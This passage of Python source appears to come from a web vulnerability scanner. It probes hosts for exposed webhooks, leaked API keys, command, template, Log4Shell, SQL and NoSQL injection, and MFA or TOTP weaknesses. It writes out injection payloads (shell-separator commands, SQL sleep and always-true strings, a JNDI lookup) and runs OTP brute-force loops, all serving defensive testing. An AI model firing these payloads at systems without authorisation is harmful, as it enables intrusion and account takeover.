            'WEBHOOK_ENDPOINT_EXPOSED',
            f'Webhook receiver endpoint accessible at {base}/webhook',
        )

    # Webhook configuration list
    status, body = _get('/api/webhooks')
    if status == 200:
        _finding(
            'CRITICAL',
            'WEBHOOK_LIST_UNAUTH',
            f'Webhook configuration list accessible (URLs, secrets) at {base}/api/webhooks',
        )

    # Mattermost incoming webhook
    status, body = _get('/api/v1/incoming_webhook')
    if status == 200:
        _finding(
            'HIGH',
            'MATTERMOST_WEBHOOK_EXPOSED',
            f'Mattermost incoming webhook endpoint accessible at {base}/api/v1/incoming_webhook',
        )

    return findings


def scan_hardcoded_api_keys_in_response(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Scan HTTP responses for hardcoded API keys and service credentials.

    Fetches common configuration endpoints and applies regex patterns to detect
    AWS access key IDs, Stripe live secret keys, GitHub personal access tokens,
    and generic API key assignments embedded in plaintext HTTP responses.

    Probes:
      GET /            -> full response body
      GET /config      -> app configuration endpoint
      GET /api/config  -> API configuration endpoint

    Patterns:
      AKIA[0-9A-Z]{16}                            -> CRIT  HARDCODED_AWS_KEY
      sk_live_[0-9a-zA-Z]{24}                     -> CRIT  HARDCODED_STRIPE_KEY
      ghp_[A-Za-z0-9]{36} | github_pat_           -> CRIT  HARDCODED_GITHUB_TOKEN
      api[_-]key['"]?\\s*[:=]\\s*['"][A-Za-z0-9]{20,} -> HIGH  HARDCODED_API_KEY

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    scheme = 'https' if port in (443, 8443) else 'http'
    base = f'{scheme}://{host}:{port}'
    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    _AWS_KEY_RE = re.compile(r'AKIA[0-9A-Z]{16}')
    _STRIPE_KEY_RE = re.compile(r'sk_live_[0-9a-zA-Z]{24}')
    _GITHUB_TOKEN_RE = re.compile(r'(ghp_[A-Za-z0-9]{36}|github_pat_)')
    _GENERIC_API_KEY_RE = re.compile(r'api[_-]key[\'"]?\s*[:=]\s*[\'"][A-Za-z0-9]{20,}',
                                     re.IGNORECASE)

    def _get(path: str):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read(65536).decode('utf-8', errors='replace')
                return resp.status, body
        except urllib.error.HTTPError as exc:
            return exc.code, ''
        except Exception:
            return None, ''

    def _finding(severity, title, detail):
        findings.append({'severity': severity, 'title': title, 'detail': detail,
                         'host': host, 'port': port})

    for path in ('/', '/config', '/api/config'):
        status, body = _get(path)
        if status != 200 or not body:
            continue

        if _AWS_KEY_RE.search(body):
            _finding(
                'CRITICAL',
                'HARDCODED_AWS_KEY',
                f'AWS access key ID found in HTTP response from {base}{path}',
            )

        if _STRIPE_KEY_RE.search(body):
            _finding(
                'CRITICAL',
                'HARDCODED_STRIPE_KEY',
                f'Stripe live secret key exposed in HTTP response from {base}{path}',
            )

        if _GITHUB_TOKEN_RE.search(body):
            _finding(
                'CRITICAL',
                'HARDCODED_GITHUB_TOKEN',
                f'GitHub personal access token exposed in HTTP response from {base}{path}',
            )

        if _GENERIC_API_KEY_RE.search(body):
            _finding(
                'HIGH',
                'HARDCODED_API_KEY',
                f'Generic API key pattern found in HTTP response from {base}{path}',
            )

    return findings


def probe_command_injection_surface(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Detect command injection vulnerability surface in web applications.

    Tests common injection entry points using blind time-delay and reflected-output
    techniques derived from Chapter 14 (Web Application Testing) of Georgia Weidman's
    "Penetration Testing: A Hands-On Introduction to Hacking." Payloads are safe:
    they target loopback-only ping and benign math evaluation — no data exfiltration.

    Detection logic:
      Ping time-delay: payloads containing '; ping -c 1 127.0.0.1 #',
        '| ping -c 1 127.0.0.1', '$(ping -c 1 127.0.0.1)' sent as GET
        params (cmd, exec, command, ping, host, ip, query, search) and as
        POST JSON body {cmd: payload, host: payload} to paths
        /, /api/, /api/v1/, /search, /exec, /cmd, /run.
        Response time > 3 s -> HIGH COMMAND_INJECTION_TIME_DELAY.
        Response contains 'PING' or 'icmp' or 'bytes from'
        -> CRITICAL COMMAND_INJECTION_OUTPUT_REFLECTED.
      Template injection: {{7*7}} and ${7*7} in same params/paths.
        Response contains '49' -> CRITICAL TEMPLATE_INJECTION_MATH_EVAL.
      Log4Shell variant: ${jndi:ldap://127.0.0.1/a} in User-Agent header.
        Response time > 3 s -> CRITICAL LOG4SHELL_JNDI_SURFACE.

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 80).
        timeout: Per-request timeout in seconds (default 10.0).

    Returns:
        list of {severity, title, detail, host, port}
    """
    import time as _time

    scheme = 'https' if port in (443, 8443) else 'http'
    base = f'{scheme}://{host}:{port}'
    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    PING_PAYLOADS = [
        '; ping -c 1 127.0.0.1 #',
        '| ping -c 1 127.0.0.1',
        '$(ping -c 1 127.0.0.1)',
    ]
    TEMPLATE_PAYLOADS = ['{{7*7}}', '${7*7}']
    PARAM_NAMES = ['cmd', 'exec', 'command', 'ping', 'host', 'ip', 'query', 'search']
    PROBE_PATHS = ['/', '/api/', '/api/v1/', '/search', '/exec', '/cmd', '/run']

    def _finding(severity, title, detail):
        findings.append({'severity': severity, 'title': title, 'detail': detail,
                         'host': host, 'port': port})

    def _get_timed(path, params):
        query = '&'.join(f'{k}={urllib.parse.quote_plus(v)}' for k, v in params.items())
        url = f'{base}{path}?{query}'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        t0 = _time.monotonic()
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read(32768).decode('utf-8', errors='replace')
                elapsed = _time.monotonic() - t0
                return elapsed, body
        except urllib.error.HTTPError as exc:
            elapsed = _time.monotonic() - t0
            return elapsed, ''
        except Exception:
            return 0.0, ''

    def _post_timed(path, payload_dict, extra_headers=None):
        url = f'{base}{path}'
        data = json.dumps(payload_dict).encode('utf-8')
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        if extra_headers:
            headers.update(extra_headers)
        req = urllib.request.Request(url, data=data, headers=headers, method='POST')
        t0 = _time.monotonic()
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read(32768).decode('utf-8', errors='replace')
                elapsed = _time.monotonic() - t0
                return elapsed, body
        except urllib.error.HTTPError as exc:
            elapsed = _time.monotonic() - t0
            return elapsed, ''
        except Exception:
            return 0.0, ''

    seen_titles = set()

    def _record(severity, title, detail):
        key = (severity, title)
        if key not in seen_titles:
            seen_titles.add(key)
            _finding(severity, title, detail)

    # Ping time-delay and reflected-output probes
    for path in PROBE_PATHS:
        for payload in PING_PAYLOADS:
            for param in PARAM_NAMES:
                elapsed, body = _get_timed(path, {param: payload})
                if elapsed > 3.0:
                    _record(
                        'HIGH',
                        'COMMAND_INJECTION_TIME_DELAY',
                        f'Ping time-delay ({elapsed:.1f}s) on GET {base}{path}?{param}=<payload>; '
                        f'payload: {payload!r}',
                    )
                if body and ('PING' in body or 'icmp' in body.lower() or 'bytes from' in body):
                    _record(
                        'CRITICAL',
                        'COMMAND_INJECTION_OUTPUT_REFLECTED',
                        f'Ping output reflected in GET response at {base}{path}?{param}=<payload>; '
                        f'payload: {payload!r}',
                    )

        # POST JSON ping probes
        for payload in PING_PAYLOADS:
            for key in ('cmd', 'host'):
                elapsed, body = _post_timed(path, {key: payload})
                if elapsed > 3.0:
                    _record(
                        'HIGH',
                        'COMMAND_INJECTION_TIME_DELAY',
                        f'Ping time-delay ({elapsed:.1f}s) on POST {base}{path} '
                        f'JSON {{{key!r}: payload}}; payload: {payload!r}',
                    )
                if body and ('PING' in body or 'icmp' in body.lower() or 'bytes from' in body):
                    _record(
                        'CRITICAL',
                        'COMMAND_INJECTION_OUTPUT_REFLECTED',
                        f'Ping output reflected in POST response at {base}{path} '
                        f'JSON {{{key!r}: payload}}; payload: {payload!r}',
                    )

    # Template injection probes
    for path in PROBE_PATHS:
        for payload in TEMPLATE_PAYLOADS:
            for param in PARAM_NAMES:
                _, body = _get_timed(path, {param: payload})
                if body and '49' in body:
                    _record(
                        'CRITICAL',
                        'TEMPLATE_INJECTION_MATH_EVAL',
                        f'Template expression {payload!r} evaluated to 49 in GET response at '
                        f'{base}{path}?{param}=<payload>',
                    )
            for key in ('cmd', 'query', 'search'):
                _, body = _post_timed(path, {key: payload})
                if body and '49' in body:
                    _record(
                        'CRITICAL',
                        'TEMPLATE_INJECTION_MATH_EVAL',
                        f'Template expression {payload!r} evaluated to 49 in POST response at '
                        f'{base}{path} JSON {{{key!r}: payload}}',
                    )

    # Log4Shell JNDI probe via User-Agent
    log4j_payload = '${jndi:ldap://127.0.0.1/a}'
    for path in ('/', '/api/', '/api/v1/'):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={'User-Agent': log4j_payload, 'Accept': '*/*'},
        )
        t0 = _time.monotonic()
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                resp.read(1024)
                elapsed = _time.monotonic() - t0
        except Exception:
            elapsed = _time.monotonic() - t0
        if elapsed > 3.0:
            _record(
                'CRITICAL',
                'LOG4SHELL_JNDI_SURFACE',
                f'Log4Shell JNDI payload in User-Agent caused {elapsed:.1f}s delay at '
                f'{base}{path}; payload: {log4j_payload!r}',
            )

    return findings


def probe_sql_injection_surface(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Detect SQL injection vulnerability surface via time-based, error-based,
    boolean-based, NoSQL operator, and server-error probes.

    Detection logic derived from Chapter 14 (Web Application Testing, SQL Injection
    section) of Georgia Weidman's "Penetration Testing: A Hands-On Introduction to
    Hacking," supplemented by standard blind SQLi tradecraft.

    Time-based blind:
      Payloads: "' OR SLEEP(3)-- -", "'; WAITFOR DELAY '0:0:3'-- -",
        "1 AND 1=SLEEP(3)" via GET params id, user_id, search, q, category
        and POST JSON {id: payload}, {user: payload}.
        Response time > 4 s -> HIGH SQL_INJECTION_TIME_BASED.

    Error-based:
      Payloads: "'", "''", "')", "1 ORDER BY 100--"
        via same GET params and POST JSON.
        Response body matches SQL error strings (mysql_fetch, ORA-, syntax error,
        SQLSTATE, pg_query, unterminated quoted)
        -> CRITICAL SQL_INJECTION_ERROR_BASED.

    Boolean-based:
      Send "' OR '1'='1" vs "' OR '1'='2" to same endpoints.
      If response length differs by > 100 bytes -> HIGH SQL_INJECTION_BOOLEAN_BASED.

    NoSQL operator injection:
      POST JSON body {"$gt": ""} and {"$ne": null} at common paths.
      Response changes vs baseline -> HIGH NOSQL_INJECTION_OPERATOR.

    Server error short-circuit:
      Any injection payload that returns HTTP 500
      -> MEDIUM SQL_INJECTION_SERVER_ERROR.

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 80).
        timeout: Per-request timeout in seconds (default 10.0).

    Returns:
        list of {severity, title, detail, host, port}
    """
    import time as _time

    scheme = 'https' if port in (443, 8443) else 'http'
    base = f'{scheme}://{host}:{port}'
    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    TIME_PAYLOADS = [
        "' OR SLEEP(3)-- -",
        "'; WAITFOR DELAY '0:0:3'-- -",
        "1 AND 1=SLEEP(3)",
    ]
    ERROR_PAYLOADS = ["'", "''", "')", "1 ORDER BY 100--"]
    GET_PARAMS = ['id', 'user_id', 'search', 'q', 'category']
    PROBE_PATHS = ['/', '/api/', '/api/v1/', '/search', '/login', '/users']
    SQL_ERROR_RE = re.compile(
        r'(mysql_fetch|ORA-[0-9]{4}|syntax error|SQLSTATE|pg_query'
        r'|unterminated quoted|You have an error in your SQL)',
        re.IGNORECASE,
    )

    def _finding(severity, title, detail):
        findings.append({'severity': severity, 'title': title, 'detail': detail,
                         'host': host, 'port': port})

    seen_titles = set()

    def _record(severity, title, detail):
        key = (severity, title)
        if key not in seen_titles:
            seen_titles.add(key)
            _finding(severity, title, detail)

    def _get_status_timed(path, params):
        query = '&'.join(
            f'{k}={urllib.parse.quote_plus(str(v))}' for k, v in params.items()
        )
        url = f'{base}{path}?{query}'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        t0 = _time.monotonic()
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read(32768).decode('utf-8', errors='replace')
                elapsed = _time.monotonic() - t0
                return resp.status, elapsed, body
        except urllib.error.HTTPError as exc:
            elapsed = _time.monotonic() - t0
            try:
                body = exc.read(4096).decode('utf-8', errors='replace')
            except Exception:
                body = ''
            return exc.code, elapsed, body
        except Exception:
            return None, _time.monotonic() - t0, ''

    def _post_status_timed(path, payload_dict):
        url = f'{base}{path}'
        data = json.dumps(payload_dict).encode('utf-8')
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        req = urllib.request.Request(url, data=data, headers=headers, method='POST')
        t0 = _time.monotonic()
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read(32768).decode('utf-8', errors='replace')
                elapsed = _time.monotonic() - t0
                return resp.status, elapsed, body
        except urllib.error.HTTPError as exc:
            elapsed = _time.monotonic() - t0
            try:
                body = exc.read(4096).decode('utf-8', errors='replace')
            except Exception:
                body = ''
            return exc.code, elapsed, body
        except Exception:
            return None, _time.monotonic() - t0, ''

    # Time-based blind SQLi
    for path in PROBE_PATHS:
        for payload in TIME_PAYLOADS:
            for param in GET_PARAMS:
                status, elapsed, body = _get_status_timed(path, {param: payload})
                if elapsed > 4.0:
                    _record(
                        'HIGH',
                        'SQL_INJECTION_TIME_BASED',
                        f'Time-delay ({elapsed:.1f}s) on GET {base}{path}?{param}=<payload>; '
                        f'payload: {payload!r}',
                    )
                if status == 500:
                    _record(
                        'MEDIUM',
                        'SQL_INJECTION_SERVER_ERROR',
                        f'HTTP 500 on GET {base}{path}?{param}=<payload>; payload: {payload!r}',
                    )
            for key in ('id', 'user'):
                status, elapsed, body = _post_status_timed(path, {key: payload})
                if elapsed > 4.0:
                    _record(
                        'HIGH',
                        'SQL_INJECTION_TIME_BASED',
                        f'Time-delay ({elapsed:.1f}s) on POST {base}{path} '
                        f'JSON {{{key!r}: payload}}; payload: {payload!r}',
                    )
                if status == 500:
                    _record(
                        'MEDIUM',
                        'SQL_INJECTION_SERVER_ERROR',
                        f'HTTP 500 on POST {base}{path} '
                        f'JSON {{{key!r}: payload}}; payload: {payload!r}',
                    )

    # Error-based SQLi
    for path in PROBE_PATHS:
        for payload in ERROR_PAYLOADS:
            for param in GET_PARAMS:
                status, _, body = _get_status_timed(path, {param: payload})
                if body and SQL_ERROR_RE.search(body):
                    _record(
                        'CRITICAL',
                        'SQL_INJECTION_ERROR_BASED',
                        f'SQL error string in GET response at {base}{path}?{param}=<payload>; '
                        f'payload: {payload!r}',
                    )
                if status == 500:
                    _record(
                        'MEDIUM',
                        'SQL_INJECTION_SERVER_ERROR',
                        f'HTTP 500 on GET {base}{path}?{param}=<payload>; payload: {payload!r}',
                    )
            for key in ('id', 'user'):
                status, _, body = _post_status_timed(path, {key: payload})
                if body and SQL_ERROR_RE.search(body):
                    _record(
                        'CRITICAL',
                        'SQL_INJECTION_ERROR_BASED',
                        f'SQL error string in POST response at {base}{path} '
                        f'JSON {{{key!r}: payload}}; payload: {payload!r}',
                    )
                if status == 500:
                    _record(
                        'MEDIUM',
                        'SQL_INJECTION_SERVER_ERROR',
                        f'HTTP 500 on POST {base}{path} '
                        f'JSON {{{key!r}: payload}}; payload: {payload!r}',
                    )

    # Boolean-based SQLi
    TRUE_PAYLOAD = "' OR '1'='1"
    FALSE_PAYLOAD = "' OR '1'='2"
    for path in PROBE_PATHS:
        for param in GET_PARAMS:
            _, _, body_true = _get_status_timed(path, {param: TRUE_PAYLOAD})
            _, _, body_false = _get_status_timed(path, {param: FALSE_PAYLOAD})
            if body_true and body_false and abs(len(body_true) - len(body_false)) > 100:
                _record(
                    'HIGH',
                    'SQL_INJECTION_BOOLEAN_BASED',
                    f'Boolean-based length differential ({len(body_true)} vs {len(body_false)} bytes) '
                    f'at GET {base}{path}?{param}=<true/false payload>',
                )

    # NoSQL operator injection
    NOSQL_PATHS = ['/', '/api/', '/api/v1/', '/login', '/users']
    for path in NOSQL_PATHS:
        # Baseline
        _, _, body_baseline = _post_status_timed(path, {'user': 'baseline_xyz_noinject'})
        for nosql_payload in ({"$gt": ""}, {"$ne": None}):
            _, _, body_inject = _post_status_timed(path, {'user': nosql_payload})
            if (body_inject and body_baseline is not None
                    and abs(len(body_inject) - len(body_baseline)) > 50):
                _record(
                    'HIGH',
                    'NOSQL_INJECTION_OPERATOR',
                    f'NoSQL operator payload {nosql_payload!r} changed response length '
                    f'({len(body_baseline)} -> {len(body_inject)} bytes) at POST {base}{path}',
                )

    return findings


def probe_mfa_bypass_surface(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Detect MFA bypass vulnerability surfaces on web authentication endpoints.

    Source: Roger Grimes, "Hacking Multifactor Authentication" Ch.5 (Hacking MFA in
    General), Ch.8 (SMS Attacks), Ch.9 (OTP Attacks), Ch.14 (Brute-Force Attacks).

    Key attack classes:
    - OTP brute force: no lockout after sequential incorrect attempts (Ch.14)
    - OTP reuse / replay: same code accepted twice without invalidation (Ch.9)
    - Response manipulation: server returns 200 regardless of OTP value (Ch.5)
    - Timing oracle: response time differs between OTP attempts, leaking info (Ch.9)
    - Backup code exposure: unauthenticated access to recovery code endpoints (Ch.9)
    - SMS MFA downgrade: SIM-swap and SS7-interception risk when SMS is offered (Ch.8)

    Probes:
      GET /api/verify, /api/otp, /api/2fa, /api/totp, /api/mfa/verify
           200|400|405|422 -> MEDIUM  MFA_VERIFICATION_ENDPOINT_FOUND
      POST <ep> x10 wrong OTP, no 429/lockout -> HIGH    MFA_NO_RATE_LIMITING
      No lockout + 10 attempts                -> CRITICAL MFA_BRUTEFORCEABLE_OTP
      Same OTP submitted twice -> 200         -> HIGH    MFA_OTP_REUSE_SURFACE
      Fixed OTP "123456"/"000000" -> 200      -> CRITICAL MFA_ACCEPTS_ANY_OTP
      Response-time deviation > 0.3s          -> HIGH    MFA_TIMING_ORACLE
      GET /api/backup-codes, /recovery-codes  -> HIGH    BACKUP_CODES_ENDPOINT
      Login body contains "sms"               -> MEDIUM  SMS_MFA_USED
      GET /api/webauthn/register              -> INFO    WEBAUTHN_ENDPOINT_PRESENT

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 80).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    import time as _time_mfa

    scheme = 'https' if port in (443, 8443) else 'http'
    base   = f'{scheme}://{host}:{port}'
    findings: list = []

    def _rec(sev, title, detail):
        findings.append({'severity': sev, 'title': title, 'detail': detail,
                         'host': host, 'port': port})

    MFA_ENDPOINTS = [
        '/api/verify',
        '/api/otp',
        '/api/2fa',
        '/api/totp',
        '/api/mfa/verify',
        '/api/auth/verify',
        '/api/v1/verify',
        '/api/v1/2fa',
    ]
    BACKUP_ENDPOINTS = [
        '/api/backup-codes',
        '/api/recovery-codes',
        '/settings/backup-codes',
        '/api/mfa/backup-codes',
        '/api/account/recovery-codes',
    ]
    WEBAUTHN_ENDPOINTS = [
        '/api/webauthn/register',
        '/api/webauthn/authenticate',
        '/api/passkey/register',
        '/api/passkey/authenticate',
    ]

    # --- 1. Discover live MFA verification endpoints ---
    live_mfa_eps = []
    for ep in MFA_ENDPOINTS:
        sc, body = _http_get(f'{base}{ep}',
                             headers={'Accept': 'application/json'},
                             timeout=timeout)
        if sc in (200, 400, 405, 422):
            live_mfa_eps.append(ep)
            _rec('MEDIUM', 'MFA_VERIFICATION_ENDPOINT_FOUND',
                 f'MFA verification endpoint discovered: GET {base}{ep} -> HTTP {sc}. '
                 f'Surface exists for OTP brute-force, replay, and bypass attacks. '
                 f'Response excerpt: {(body or "")[:200]}')

    # --- 2. Rate-limit and brute-force surface ---
    for ep in live_mfa_eps:
        url = f'{base}{ep}'
        lockout_triggered = False
        response_codes = []
        for attempt in range(10):
            otp = f'{(attempt + 1) * 100000 % 1000000:06d}'  # sequential wrong OTPs
            sc, _ = _http_post(url,
                               {'otp': otp, 'code': otp, 'token': otp},
                               headers={'Accept': 'application/json'},
                               timeout=timeout)
            response_codes.append(sc)
            if sc in (429, 423):
                lockout_triggered = True
                break

        if not lockout_triggered and any(c in (200, 400, 401, 403, 422)
                                         for c in response_codes if c is not None):
            _rec('HIGH', 'MFA_NO_RATE_LIMITING',
                 f'10 sequential wrong OTP submissions to POST {base}{ep} produced no '
                 f'429 (Too Many Requests) or 423 (Locked) response. '
                 f'Response codes observed: {response_codes}. '
                 f'Rate-limit absent — endpoint accessible for automated OTP enumeration.')

            # If no lockout at all across all attempts -> full brute-force surface
            all_non_lockout = all(c not in (429, 423) for c in response_codes
                                  if c is not None)
            if all_non_lockout and len(response_codes) >= 10:
                _rec('CRITICAL', 'MFA_BRUTEFORCEABLE_OTP',
                     f'No lockout after 10 sequential wrong OTP attempts on POST {base}{ep}. '
                     f'6-digit TOTP search space = 1,000,000 values; at unrestricted speed '
                     f'full enumeration is feasible. OTP brute-force attack surface confirmed. '
                     f'Response codes: {response_codes}')

    # --- 3. OTP reuse / replay surface ---
    for ep in live_mfa_eps:
        url = f'{base}{ep}'
        test_otp = '123456'
        sc1, _ = _http_post(url, {'otp': test_otp, 'code': test_otp},
                            headers={'Accept': 'application/json'},
                            timeout=timeout)
        sc2, _ = _http_post(url, {'otp': test_otp, 'code': test_otp},
                            headers={'Accept': 'application/json'},
                            timeout=timeout)
        if sc1 == 200 and sc2 == 200:
            _rec('HIGH', 'MFA_OTP_REUSE_SURFACE',
                 f'POST {base}{ep} returned HTTP 200 for the same OTP ("123456") submitted '
                 f'twice in rapid succession. OTP replay / reuse not prevented — '
                 f'a captured valid OTP may be replayed after first use. '
                 f'Server must invalidate each OTP immediately upon acceptance (RFC 6238 §5.2).')

    # --- 4. Response manipulation: any OTP accepted ---
    for ep in live_mfa_eps:
        url = f'{base}{ep}'
        accepted = []
        for test_otp in ('123456', '000000', '999999', '111111'):
            sc, body = _http_post(url, {'otp': test_otp, 'code': test_otp,
                                        'token': test_otp},
                                  headers={'Accept': 'application/json'},
                                  timeout=timeout)
            if sc == 200:
                accepted.append(test_otp)
        if accepted:
            _rec('CRITICAL', 'MFA_ACCEPTS_ANY_OTP',
                 f'POST {base}{ep} returned HTTP 200 for common fixed OTP value(s) '
                 f'{accepted} without a valid TOTP secret. Server may not validate OTP '
                 f'correctness — any 6-digit value bypasses MFA. '
                 f'Accepted values: {accepted}')

    # --- 5. Timing oracle ---
    for ep in live_mfa_eps:
        url = f'{base}{ep}'
        timing_samples = []
        for otp in ('000000', '111111', '222222', '333333'):
            t0 = _time_mfa.monotonic()
            _http_post(url, {'otp': otp, 'code': otp},
                       headers={'Accept': 'application/json'},
                       timeout=timeout)
            timing_samples.append(_time_mfa.monotonic() - t0)
        if len(timing_samples) >= 4:
            avg = sum(timing_samples) / len(timing_samples)
            deviation = max(abs(t - avg) for t in timing_samples)
            if deviation > 0.3:
                _rec('HIGH', 'MFA_TIMING_ORACLE',
                     f'POST {base}{ep} OTP validation response times vary by '
                     f'{deviation:.3f}s across sequential wrong OTP submissions '
                     f'(samples: {["{:.3f}".format(t) for t in timing_samples]}). '
                     f'Timing side-channel may allow distinguishing valid OTP code ranges. '
                     f'OTP comparison must use constant-time equality checks.')

    # --- 6. Backup / recovery code endpoint exposure ---
    for ep in BACKUP_ENDPOINTS:
        sc, body = _http_get(f'{base}{ep}',
                             headers={'Accept': 'application/json'},
                             timeout=timeout)
        if sc in (200, 400, 405):
            _rec('HIGH', 'BACKUP_CODES_ENDPOINT',
                 f'Backup/recovery code endpoint reachable without confirmed auth: '
                 f'GET {base}{ep} -> HTTP {sc}. '
                 f'Backup codes bypass the primary MFA factor; exposure enables account '
                 f'takeover bypassing TOTP entirely. Endpoint must require authenticated '
                 f'session scoped to the account owner. '
                 f'Response excerpt: {(body or "")[:200]}')

    # --- 7. SMS MFA detection ---
    sc_login, body_login = _http_post(
        f'{base}/api/auth/login',
        {'username': 'probe@example.com', 'password': 'wrongpassword'},
        headers={'Accept': 'application/json'},
        timeout=timeout,
    )
    if body_login and 'sms' in body_login.lower():
        _rec('MEDIUM', 'SMS_MFA_USED',
             f'Login response from POST {base}/api/auth/login contains "sms" keyword — '
             f'application appears to use SMS-based MFA. SMS MFA is vulnerable to '
             f'SIM-swap attacks, SS7 protocol interception, and real-time OTP phishing '
             f'(Grimes "Hacking MFA" Ch.8). Prefer TOTP or FIDO2 hardware tokens. '
             f'Response excerpt: {(body_login or "")[:200]}')

    # --- 8. WebAuthn / passkey endpoint presence ---
    for ep in WEBAUTHN_ENDPOINTS:
        sc, body = _http_get(f'{base}{ep}',
                             headers={'Accept': 'application/json'},
                             timeout=timeout)
        if sc in (200, 400, 405):
            _rec('INFO', 'WEBAUTHN_ENDPOINT_PRESENT',
                 f'WebAuthn/passkey endpoint present: GET {base}{ep} -> HTTP {sc}. '
                 f'Application supports phishing-resistant hardware-bound authentication. '
                 f'Verify registration and assertion flows enforce origin binding '
                 f'and replay protection per FIDO2 spec (CTAP2 §6). '
                 f'Response excerpt: {(body or "")[:150]}')
            break

    return findings


def probe_totp_implementation_weakness(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Detect TOTP (Time-based One-Time Password) implementation weaknesses.

    Source: Roger Grimes, "Hacking Multifactor Authentication" Ch.9 (OTP Attacks),
    Ch.14 (Brute-Force Attacks), Ch.19 (API Abuses), Ch.5 (Hacking MFA in General).

    Key weaknesses covered:
    - QR code / seed secret exposed unauthenticated (Ch.9)
    - TOTP enrollment without authentication (Ch.9, Ch.19)
    - TOTP disable without step-up MFA verification (Ch.9)
    - Step-up auth inconsistency across sensitive paths (Ch.5)
    - OTP seed derivable from sequential user IDs (Ch.9)

    Probes:
      GET /api/totp/qr, /api/2fa/qr, /api/setup/qr, /api/totp-secret
           otpauth:// URI in body      -> CRITICAL TOTP_SECRET_QR_EXPOSED
           base32 secret pattern match -> CRITICAL TOTP_SECRET_EXPOSED
      GET/POST /api/totp/enroll, /api/2fa/setup (no auth)
                                       -> HIGH    TOTP_ENROLLMENT_UNAUTH
      POST /api/totp/disable (no OTP challenge in response)
                                       -> CRITICAL TOTP_DISABLE_NO_VERIFICATION
      Sensitive-path 200 without MFA challenge vs path with challenge
                                       -> HIGH    STEP_UP_AUTH_BYPASS
      Sequential user-ID probe: monotonic response-length delta
                                       -> HIGH    PREDICTABLE_OTP_SEED

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 80).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    import re as _re_totp

    scheme = 'https' if port in (443, 8443) else 'http'
    base   = f'{scheme}://{host}:{port}'
    findings: list = []

    # Base32 secret pattern: 16-64 uppercase A-Z2-7 chars (RFC 4648 §6)
    _B32_RE = _re_totp.compile(r'\b([A-Z2-7]{16,64})\b')
    # otpauth:// URI scheme
    _OTP_URI_RE = _re_totp.compile(r'otpauth://totp/[^\s\'"<>]+')

    def _rec(sev, title, detail):
        findings.append({'severity': sev, 'title': title, 'detail': detail,
                         'host': host, 'port': port})

    QR_ENDPOINTS = [
        '/api/totp/qr',
        '/api/2fa/qr',
        '/api/setup/qr',
        '/api/totp-secret',
        '/api/mfa/qr',
        '/api/auth/totp/setup',
        '/user/settings/2fa/qr',
        '/api/v1/totp/secret',
    ]
    ENROLL_ENDPOINTS = [
        '/api/totp/enroll',
        '/api/2fa/setup',
        '/api/mfa/enroll',
        '/api/auth/2fa/enable',
        '/api/v1/2fa/setup',
    ]
    DISABLE_ENDPOINTS = [
        '/api/totp/disable',
        '/api/2fa/remove',
        '/api/mfa/disable',
        '/api/auth/2fa/disable',
        '/api/v1/2fa/remove',
    ]
    SENSITIVE_PATHS = [
        '/api/admin',
        '/api/admin/users',
        '/api/settings/security',
        '/api/payment',
        '/api/export',
    ]

    # --- 1. QR code / TOTP secret exposure ---
    for ep in QR_ENDPOINTS:
        sc, body = _http_get(f'{base}{ep}',
                             headers={'Accept': 'application/json'},
                             timeout=timeout)
        if sc not in (200, 400, 405):
            continue
        body_str = body or ''

        otp_uri_match = _OTP_URI_RE.search(body_str)
        if otp_uri_match:
            _rec('CRITICAL', 'TOTP_SECRET_QR_EXPOSED',
                 f'GET {base}{ep} (HTTP {sc}) returned an otpauth:// URI: '
                 f'{otp_uri_match.group()[:150]}. '
                 f'This URI encodes the TOTP seed; any observer can enroll a parallel '
                 f'authenticator and generate valid OTPs permanently without the device. '
                 f'Endpoint must require an authenticated session scoped to the owning user.')
            continue

        b32_match = _B32_RE.search(body_str)
        if b32_match and sc == 200:
            _rec('CRITICAL', 'TOTP_SECRET_EXPOSED',
                 f'GET {base}{ep} (HTTP 200) returned a probable base32-encoded TOTP '
                 f'secret matching RFC 4648 §6 alphabet: {b32_match.group()[:32]}... '
                 f'(length {len(b32_match.group())} chars). '
                 f'Secret exposure allows permanent OTP generation independent of the '
                 f'registered device. Enforce per-user authentication and authorization.')

    # --- 2. TOTP enrollment without authentication ---
    for ep in ENROLL_ENDPOINTS:
        sc_g, body_g = _http_get(f'{base}{ep}',
                                 headers={'Accept': 'application/json'},
                                 timeout=timeout)
        if sc_g in (200, 400, 405):
            _rec('HIGH', 'TOTP_ENROLLMENT_UNAUTH',
                 f'TOTP enrollment endpoint accessible without credentials: '
